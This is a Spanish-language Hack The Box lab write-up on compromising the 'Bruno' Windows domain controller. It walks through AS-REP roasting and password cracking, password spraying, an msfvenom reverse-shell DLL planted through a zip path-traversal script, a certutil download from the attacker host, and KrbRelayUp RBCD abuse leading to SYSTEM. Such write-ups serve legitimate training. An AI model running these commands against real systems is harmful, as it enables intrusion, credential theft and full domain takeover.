---
permalink:
tags:
title: Bruno - Medium (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p21,53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,9389,49664,49668,50616,50622,55058,55059 10.129.238.9
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-12 15:44 -0300
Nmap scan report for 10.129.238.9
Host is up (1.1s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-29-22  04:55PM       <DIR>          app
| 06-29-22  04:33PM       <DIR>          benign
| 06-29-22  01:41PM       <DIR>          malicious
|_06-29-22  04:33PM       <DIR>          queue
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-12 18:46:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-12T18:49:59+00:00; +2m39s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
443/tcp   open  ssl/https?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=bruno-BRUNODC-CA
| Not valid before: 2022-06-29T13:23:01
|_Not valid after:  2121-06-29T13:33:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-12T18:49:59+00:00; +2m39s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
|_ssl-date: 2026-01-12T18:50:00+00:00; +2m38s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl, Site: Default-First-Site-Name)
|_ssl-date: 2026-01-12T18:49:59+00:00; +2m39s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Not valid before: 2025-10-08T09:36:40
|_Not valid after:  2026-04-09T09:36:40
|_ssl-date: 2026-01-12T18:49:59+00:00; +2m39s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50616/tcp open  msrpc         Microsoft Windows RPC
50622/tcp open  msrpc         Microsoft Windows RPC
55058/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
55059/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-12T18:49:03
|_  start_date: N/A
|_clock-skew: mean: 2m38s, deviation: 0s, median: 2m38s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.89 seconds
```

## Website 

Nada en la pagina.

![image-center](/assets/images/Pasted image 20260112154355.png)
## Shell as svc_scan
### FTP

Por `ftp` veo que hay `4` carpetas, de las cuales solo `app` tiene algunos binarios ejecutables.

```bash
 ftp anonymous@10.129.238.9                            
Connected to 10.129.238.9.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||50752|)
125 Data connection already open; Transfer starting.
06-29-22  04:55PM       <DIR>          app
06-29-22  04:33PM       <DIR>          benign
06-29-22  01:41PM       <DIR>          malicious
06-29-22  04:33PM       <DIR>          queue
226 Transfer complete.
```

Luego de descargármelos con `wget` veo en el `changelog` que se habla del usuario `svc_scan`.

```bash
cat changelog        
Version 0.3
- integrated with dev site
- automation using svc_scan

Version 0.2
- additional functionality 

Version 0.1
- initial support for EICAR string
```
### Crack password

Intente un `AS-REP Roast attack` contra este usuario, lo que me devolvió un `hash`.

```bash
impacket-GetNPUsers bruno.vl/guest@brunodc.bruno.vl -no-pass -usersfile users -dc-ip 10.129.238.9                                             
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

$krb5asrep$23$svc_scan@BRUNO.VL:380fee0747b027026ea845f084291e7c$39c52720641fd34d557b35db56f9b251120cd595fcfb72e1b0726a96aa28a1088b41ab98a6fa8e4fb930752b0b0744295454c21ab3f56248d2a39b91497c23a26493b35b6dd59e7b06eee1b08f4e44c83c03eb93c0a5d93ef1c3e3fe606665ab66bcf15037f0be83e0316e67fdf616531f2b5d53e37a387cf24ee1754a1aee33f112e9f7a9e2fafe4f541495725ab1b975cdb41bab1b2fa941a236fcd3786a2e2eb5cd6df32cac2bdc0b12112ca907a93f261e3836e40bb1fc2c96a2ba9f0470b27a60554947f4d938880098ce54e7a3558924e5b1bbb192e01edc90dc93c0330a59c865
```

Este hash lo coloque en un archivo y lo rompí con `john`.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Sunshine1        ($krb5asrep$23$svc_scan@BRUNO.VL)     
1g 0:00:00:00 DONE (2026-01-12 15:53) 20.00g/s 614400p/s 614400c/s 614400C/s softball27..*star*
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Shares enumeration

Con esas credenciales enumere `Shares` 
```bash
nxc smb bruno.vl -u svc_scan -p 'Sunshine1' --shares
SMB         10.129.238.9    445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False) 
SMB         10.129.238.9    445    BRUNODC          [+] bruno.vl\svc_scan:Sunshine1 
SMB         10.129.238.9    445    BRUNODC          [*] Enumerated shares
SMB         10.129.238.9    445    BRUNODC          Share           Permissions     Remark
SMB         10.129.238.9    445    BRUNODC          -----           -----------     ------
SMB         10.129.238.9    445    BRUNODC          ADMIN$                          Remote Admin
SMB         10.129.238.9    445    BRUNODC          C$                              Default share
SMB         10.129.238.9    445    BRUNODC          CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.238.9    445    BRUNODC          IPC$            READ            Remote IPC
SMB         10.129.238.9    445    BRUNODC          NETLOGON        READ            Logon server share 
SMB         10.129.238.9    445    BRUNODC          queue           READ,WRITE      
SMB         10.129.238.9    445    BRUNODC          SYSVOL          READ            Logon server share 
```
### Valid users

Y luego con `rpcclient` liste usuarios.

```bash
rpcclient -U 'svc_scan%Sunshine1' 10.129.238.9     
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[svc_net] rid:[0x44f]
user:[svc_scan] rid:[0x450]
user:[Chloe.Ball] rid:[0x452]
user:[Kayleigh.Patel] rid:[0x453]
user:[Donna.Harrison] rid:[0x454]
user:[Charles.Young] rid:[0x455]
user:[Graeme.Grant] rid:[0x456]
user:[Natalie.Anderson] rid:[0x457]
user:[Sam.Owen] rid:[0x458]
user:[Jeremy.Singh] rid:[0x459]
user:[Kieran.Day] rid:[0x45a]
user:[Hugh.Young] rid:[0x45b]
```
### Password spray

Realice un `Password spray` y vi que la misma password es valida también para el usuario `svc_scan`.

```bash
kerbrute passwordspray --dc 10.129.238.9 -d bruno.vl users Sunshine1 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/12/26 - Ronnie Flathers @ropnop

2026/01/12 16:01:01 >  Using KDC(s):
2026/01/12 16:01:01 >   10.129.238.9:88

2026/01/12 16:01:02 >  [+] VALID LOGIN:  svc_net@bruno.vl:Sunshine1
2026/01/12 16:01:02 >  [+] VALID LOGIN:  svc_scan@bruno.vl:Sunshine1
2026/01/12 16:01:04 >  Done! Tested 12 logins (2 successes) in 3.737 seconds 
```

Sin embargo ninguno de los dos usuario tiene la capacidad de conectarse a `WinRM`.
### Analizing binary

Analizando el binario que conseguí, veo que el mismo busca un `zip` en la ruta `C:\Samples\queue`, extrae los archivos, y luego borra el zip, y luego aplica algunas validaciones.

![image-center](/assets/images/Pasted image 20260113143644.png)

Básicamente lo corri en mi maquina, y cree además las carpetas adecuadas. Y usando `procmon` me doy cuenta que se necesita una `DLL` en el proceso la cual es `hostfxr.dll`.

![image-center](/assets/images/Pasted image 20260113144010.png)

Así que cree la misma con `msfvenom`.

```bash
msfvenom -p windows/x64/shell_reverse_tcp -f dll LHOST=10.10.17.19 LPORT=4444 > hostfxr.dll
```

Para colocarla y hacer que se ejecute, tengo que colocarla en el directorio `/app` al cual no tengo acceso, sin embargo puedo usar un `Path Traversal` para colocarlo en el mismo, así que para crear mi `zip` use este script.

```python
import zipfile
with zipfile.ZipFile('test.zip', 'w') as zip:
    zip.writestr('../app/hostfxr.dll', open('hostfxr.dll', 'rb').read())
```
### Shell

Luego de ejecutarlo, subí el `zip`.

```
```bash
# put samples.zip
# ls
drw-rw-rw-          0  Mon Jan 12 16:40:40 2026 .
drw-rw-rw-          0  Wed Jun 29 10:41:03 2022 ..
-rw-rw-rw-       9350  Mon Jan 12 16:45:01 2026 test.zip

```

Y luego de unos segundos recibi mi shell.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.238.9] 52181
Microsoft Windows [Version 10.0.20348.768]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
bruno\svc_scan
```

```powershell
PS C:\Users\svc_scan> cd desktop; cat user.txt
cd desktop; cat user.txt
b0ed1558a28695c663180244ea806b19
```
## Shell as nt authority\system

Para escalar el propio `winPEAS` me mostro que es vulnerable a `RBCD`, por lo que en este tengo q agregar un a una computadora, para eso descargue `KrbRelayUp.exe`

```powershell
PS C:\programdata> certutil -urlcache -split -f http://10.10.17.19/KrbRelayUp.exe C:\programdata\KrbRelayUp.exe
****  Online  ****
  0000  ...
  c800
CertUtil: -URLCache command completed successfully.
```

De esta manera, solo me queda conseguir un `clsid` valido que fuerce al objetivo a autenticarse usando `Kerberos`. Para eso copie este [script](https://raw.githubusercontent.com/ohpe/juicy-potato/refs/heads/master/CLSID/GetCLSID.ps1) y luego lo subí a la maquina

```powershell
PS C:\programdata> .\getsid.ps1
.\getsid.ps1

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
HKCR                                   Registry      HKEY_CLASSES_ROOT                                                 
Looking for CLSIDs
Looking for APIDs
Joining CLSIDs and APIDs
<SNIP>
```

El mismo me deja una lista en el directorio `/Windows_Server_2022_Datacenterdir/`.

```powershell
PS C:\programdata> dir C:\programdata\Windows_Server_2022_Datacenter
dir C:\programdata\Windows_Server_2022_Datacenter


    Directory: C:\programdata\Windows_Server_2022_Datacenter


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         1/12/2026   8:26 PM           3200 CLSID.list                                                           
-a----         1/12/2026   8:26 PM           7697 CLSIDs.csv                                                           
```

En mi caso fui probando uno a uno.
```powershell
PS C:\programdata> type C:\programdata\Windows_Server_2022_Datacenter\CLSIDs.csv
type C:\programdata\Windows_Server_2022_Datacenter\CLSIDs.csv
"AppId","LocalService","CLSID"
"{4A0F9AA8-A71E-4CC3-891B-76CAC67E67C0}","ALG","{D6015EC3-FA16-4813-9CA1-DA204574F5DA}"
"{88283d7c-46f4-47d5-8fc2-db0b5cf0cb54}","AppReadiness","{c980e4c2-c178-4572-935d-a8a429884806}"
"{8D315960-32C4-4235-8369-901DF222816F}","AppVClient","{F01D6448-0959-4E38-B6F6-B6643D4558FE}"
"{03E09F3B-DCE4-44FE-A9CF-82D050827E1C}","AudioSrv","{21B896BF-008D-4D01-A27B-26061B960DD7}"
"{0B15AFD8-3A99-4A6E-9975-30D66F70BD94}","AxInstSv","{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}"
"{69AD4AEE-51BE-439b-A92C-86AE490E8B30}","BITS","{03ca98d6-ff5d-49b8-abc6-03dd84127020}"
"{5E176815-9A63-4A69-810F-62E90D36612A}","cdpsvc","{206490E7-09B5-4C9D-8E54-254B87A5CEAF}"
"{D99E6E74-FC88-11D0-B498-00A0C90312F3}","CertSvc","{D99E6E73-FC88-11D0-B498-00A0C90312F3}"
"{52551A19-B337-498d-AE75-2283E29902DE}","CscService","{69486DD6-C19F-42e8-B508-A53F9F8E67B8}"
"{AAAF9453-58F9-4872-A428-0507C383AC37}","CscService","{FD3659E9-A920-4123-AD64-7FC76C7AACDF}"
"{ab7c873b-eb14-49a6-be60-a602f80e6d22}","defragsvc","{d20a3293-3341-4ae8-9aaf-8e397cb63c34}"
"{42CBFAA7-A4A7-47BB-B422-BD10E9D02700}","DiagnosticsHub.StandardCollector.Service","{42CBFAA7-A4A7-47BB-B422-BD10E9D02700}"
"{98457147-39B0-4AA0-9735-1CB7F4F6CB0F}","DmEnrollmentSvc","{1A237AAA-3F82-4D15-AC67-E9BCC06AE07C}"
"{379001DE-7108-4A45-8A74-6CD0A9FBEF2C}","dosvc","{5B99FA76-721C-423C-ADAC-56D03C8A8007}"
"{ddcfd26b-feed-44cd-b71d-79487d2e5e5a}","dps","{ddcfd26b-feed-44cd-b71d-79487d2e5e5a}"
"{ada41b3c-c6fd-4a08-8cc1-d6efde67be7d}","dps","{7022a3b3-d004-4f52-af11-e9e987fee25f}"
"{8B4B437E-4CAB-4e83-89F6-7F9F7DF414EA}","EapHost","{8B4B437E-4CAB-4e83-89F6-7F9F7DF414EA}"
"{0A886F29-465A-4aea-8B8E-BE926BFAE83E}","EapHost","{0A886F29-465A-4aea-8B8E-BE926BFAE83E}"
"{8C482DCE-2644-4419-AEFF-189219F916B9}","EapHost","{8C482DCE-2644-4419-AEFF-189219F916B9}"
"{42C21DF5-FB58-4102-90E9-96A213DC7CE8}","EntAppSvc","{42C21DF5-FB58-4102-90E9-96A213DC7CE8}"
"{C63261E4-6052-41FF-B919-496FECF4C4E5}","EntAppSvc","{C63261E4-6052-41FF-B919-496FECF4C4E5}"
"{FFE1E5FE-F1F0-48C8-953E-72BA272F2744}","EntAppSvc","{FFE1E5FE-F1F0-48C8-953E-72BA272F2744}"
"{1BE1F766-5536-11D1-B726-00C04FB926AF}","EventSystem","{1BE1F766-5536-11D1-B726-00C04FB926AF}"
"{D3DCB472-7261-43ce-924B-0704BD730D5F}","fdPHost","{D3DCB472-7261-43ce-924B-0704BD730D5F}"
"{145B4335-FE2A-4927-A040-7C35AD3180EF}","fdPHost","{145B4335-FE2A-4927-A040-7C35AD3180EF}"
"{35b1d3bb-2d4e-4a7c-9af0-f2f677af7c30}","fdPHost","{35b1d3bb-2d4e-4a7c-9af0-f2f677af7c30}"
"{75BE3767-9BAD-477C-A125-26379D3EDB4A}","FTPSVC","{75BE3767-9BAD-477C-A125-26379D3EDB4A}"
"{cd93979b-c14e-4c29-87a4-75e4f9fa5e0a}","GraphicsPerfSvc","{805a61d6-44c1-48c0-8af1-721a248effed}"
"{A9E69610-B80D-11D0-B9B9-00A0C922E750}","IISADMIN","{A9E69610-B80D-11D0-B9B9-00A0C922E750}"
"{61738644-F196-11D0-9953-00C04FD919C1}","IISADMIN","{61738644-F196-11D0-9953-00C04FD919C1}"
"{730BFCEC-E4BF-4D3A-9FBB-01DD132467A4}","InputService","{E0F55444-C140-4EF4-BDA3-621554EDB573}"
"{020FB939-2C8B-4DB7-9E90-9527966E38E5}","lfsvc","{08D9DFDF-C6F7-404A-A20F-66EEC0A609CD}"
"{e53cd6ee-5c5c-4701-9ff2-c204bfed819d}","LicenseManager","{22f5b1df-7d7a-4d21-97f8-c21aefba859c}"
"{19BCA967-D266-436f-B2D4-CBE4D4B42F96}","lltdsvc","{5BF9AA75-D7FF-4aee-AA2C-96810586456D}"
"{5C03E1B1-EB13-4DF1-8943-2FE8E7D5F309}","MapsBroker","{5C03E1B1-EB13-4DF1-8943-2FE8E7D5F309}"
"{C08E4363-9771-4955-A002-09932AE4874B}","McpManagementService","{2F21A1B8-750B-4AC7-A6E2-C70A3F2D21FB}"
"{1FCBE96C-1697-43AF-9140-2897C7C69767}","MicrosoftEdgeElevationService","{1FCBE96C-1697-43AF-9140-2897C7C69767}"
"{000C101C-0000-0000-C000-000000000046}","MSIServer","{000C101C-0000-0000-C000-000000000046}"
"{27AF75ED-20D9-11D1-B1CE-00805FC1270E}","netman","{02FAFBE2-4E3B-49BE-A5AB-FD416270EE4B}"
"{C96887DA-A652-4426-905E-4A37546F847C}","netprofm","{A47979D2-C419-11D9-A5B4-001185AD2B89}"
"{588E10FA-0618-48A1-BE2F-0AD93E899FCC}","PrintNotify","{854A20FB-2D44-457D-992F-EF13785D2B51}"
"{72E3272B-4EEA-4104-B358-1A282E4FC1AD}","profsvc","{BA677074-762C-444b-94C8-8C83F93F6605}"
"{478B41E6-3257-4519-BDA8-E971F9843849}","RmSvc","{581333F6-28DB-41BE-BC7A-FF201F12F3F6}"
"{6EBBFC6C-B721-4D10-9371-5D8E8C76D315}","RSoPProv","{F0FF8EBB-F14D-4369-BD2E-D84FBF6122D6}"
"{8217749a-e821-4001-94ce-06c6b9b97fe1}","securityhealthservice","{C39622C7-DDA7-4385-BD69-B6CC374C2E2F}"
"{2EB6D15C-5239-41CF-82FB-353D20B816CF}","SecurityHealthService","{1B48339C-D15E-45F3-AD55-A851CB66BE6B}"
"{AC05815A-A8D5-434B-B9A8-2FFD162F2B7D}","SEMgrSvc","{233F8888-506F-45BE-8B87-DFBF08F54C12}"
"{6F4B8D94-91FE-4665-B1E7-A34AE3F299F6}","SEMgrSvc","{49E6370B-AB71-40AB-92F4-B009593E4518}"
"{B1B9CBB2-B198-47E2-8260-9FD629A2B2EC}","ShellHWDetection","{555F3418-D99E-4E51-800A-6E89CFD8B1D7}"
"{f7f34f79-6791-4d4e-9f15-9eaecd50bd78}","shpamsvc","{e7921051-7828-4d09-b4fe-aa5393e85971}"
"{A1F4E726-8CF1-11D1-BF92-0060081ED811}","stisvc","{A1F4E726-8CF1-11D1-BF92-0060081ED811}"
"{B6C292BC-7C88-41EE-8B54-8EC92617E599}","stisvc","{B6C292BC-7C88-41EE-8B54-8EC92617E599}"
"{4db9c793-c48d-449c-9754-46027ee45c94}","swprv","{65EE1DBA-8FF4-4a58-AC1C-3470EE2F376A}"
"{C9F65BA8-1F8F-4382-AE27-C91FFB29275F}","TermService","{F9A874B6-F8A8-4D73-B5A8-AB610816828B}"
"{6DF5BCF4-22E9-446D-8763-A2C7677ECF7D}","TieringEngineService","{50D185B9-FFF3-4656-92C7-E4018DA4361D}"
"{D8D4249F-A8FB-44A7-8AA0-564E8C385BD6}","TrustedInstaller","{F556F9B2-C810-44A2-BA7A-3AB8C24E666D}"
"{752073A2-23F2-4396-85F0-8FDB879ED0ED}","TrustedInstaller","{3c6859ce-230b-48a4-be6c-932c0c202048}"
"{E495081B-BBA5-4b89-BA3C-3B86A686B87A}","upnphost","{0fb40f0d-1021-4022-8da0-aab0588dfc8b}"
"{E7299E79-75E5-47BB-A03D-6D319FB7F886}","UsoSvc","{84C80796-F07C-4340-8897-DA954AADBF16}"
"{F290BFB2-1864-45B1-8804-2654194A87E7}","vds","{7D1933CB-86F6-4A98-8628-01BE94C9A575}"
"{be0fc7f0-f248-4091-a123-34ca29a6901b}","vmicheartbeat","{397a2e5f-348c-482d-b9a3-57d383b483cd}"
"{56BE716B-2F76-4dfa-8702-67AE10044F0B}","VSS","{0B5A2C52-3EB9-470a-96E2-6C6D4570E40F}"
"{2ED83BAA-B2FD-43B1-99BF-E6149C622692}","WaaSMedicSvc","{72566e27-1abb-4eb3-b4f0-eb431cb1cb32}"
"{5BC7A3A1-E905-414B-9790-E511346F5CA6}","WalletService","{97061DF1-33AA-4B30-9A92-647546D943F3}"
"{27D6B72D-094D-445A-9ACE-8298CBA0611A}","WalletService","{9A3E1311-23F8-42DC-815F-DDBC763D50BB}"
"{2EA38040-0B9C-4379-87FD-4D38BB892F37}","WalletService","{02ECA72E-27DA-40E1-BDB1-4423CE649AD9}"
"{8E44A57C-5638-44D3-9B83-34DF70EB57F2}","WalletService","{84C22490-C68A-4492-B3A6-3B7CB17FA122}"
"{119817C9-666D-4053-AEDA-627D0E25CCEF}","was","{119817C9-666D-4053-AEDA-627D0E25CCEF}"
"{136A0DC7-DF5C-4271-A2AC-15DF1A1323F2}","wercplsupport","{0E9A7BB5-F699-4D66-8A47-B919F5B6A1DB}"
"{2781761E-28E2-4109-99FE-B9D127C57AFE}","WinDefend","{2781761E-28E2-4109-99FE-B9D127C57AFE}"
"{8BC3F05E-D86B-11D0-A075-00C04FB68820}","winmgmt","{8BC3F05E-D86B-11D0-A075-00C04FB68820}"
"{7006698d-2974-4091-a424-85dd0b909e23}","wisvc","{3185a766-b338-11e4-a71e-12e3f512a338}"
"{EAB99738-0ADF-4A53-856C-DE58AFDE7682}","wisvc","{7519A68F-E6F1-422E-B741-F9B960CBAA97}"
"{E055B85B-22BD-4E15-A34D-46C58AB320AD}","wisvc","{BA75691E-9FF3-492C-9053-4A91A40C556E}"
"{2568BFC5-CDBE-4585-B8AE-C403A2A5B84A}","wisvc","{6150FC78-21A1-46A4-BF3F-897090C6D79D}"
"{34E76A18-223B-4E23-BEAD-F59358CC0A90}","wpnservice","{1FD1B5A7-5C96-4711-A7C3-FFF6D21F93D9}"
"{0B789C73-D8DA-416D-B665-C1603676CEB1}","WpnUserService","{1FFE4FFD-25B1-40B1-A1EA-EF633353BB4E}"
"{AB7BDC53-0BB5-44F5-9E25-C444313D4686}","WpnUserService","{61DE29D7-7D74-4F3B-9B2B-99F88C406FB7}"
"{9E175B9C-F52A-11D8-B9A5-505054503030}","WSearch","{30766BD2-EA1C-4F28-BF27-0B44E2F68DB7}"
"{653C5148-4DCE-4905-9CFD-1B23662D3D9E}","wuauserv","{b8fc52f5-cb03-4e10-8bcb-e3ec794c54a5}"
```

Hasta que uno dio con el formato correcto y pude crear la computadora y otorgarme permisos `RBCD`.

```
PS C:\programdata> type C:\programdata\Windows_Server_2022_Datacenter\CLSIDs.csv | findstr "d99e6e74-fc88-11d0-b498-00a0c90312f3"
type C:\programdata\Windows_Server_2022_Datacenter\CLSIDs.csv | findstr "d99e6e74-fc88-11d0-b498-00a0c90312f3"
PS C:\programdata> .\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName testt$ -ComputerPassword zsln1123 --clsid d99PS C:\programdata> .\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName testt$ -ComputerPassword zsln1123 --clsid d99e6e74-fc88-11d0-b498-00a0c90312f3 -p 10246
KrbRelayUp - Relaying you to SYSTEM


[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Computer account "testt$" added with password "zsln1123"
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] RBCD rights added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp.exe spawn -m rbcd -d bruno.vl -dc brunodc.bruno.vl -cn testt$ -cp zsln1123
```
### Get service ticket

Luego con `getST` de impacket obtuve un ticket para impersonar al usuario `administrator`.

```powershell
 impacket-getST -spn 'HOST/brunodc.bruno.vl' -k -impersonate 'administrator' 'bruno.vl/testt$:zsln1123'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@HOST_brunodc.bruno.vl@BRUNO.VL.ccache
```
### Shell

Y con `psexec` realice la conexión a la maquina.

```powershell
impacket-psexec bruno.vl/administrator@brunodc.bruno.vl -k -dc-ip 10.129.238.9 -no-pass        
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on brunodc.bruno.vl.....
[*] Found writable share ADMIN$
[*] Uploading file cAgsRnqh.exe
[*] Opening SVCManager on brunodc.bruno.vl.....
[*] Creating service orkL on brunodc.bruno.vl.....
[*] Starting service orkL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.768]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

```powershell
C:\Users\Administrator\Desktop> type root.txt
ba60d56ce0f3c758b3491251c5032d61
```

`~Happy Hacking.`
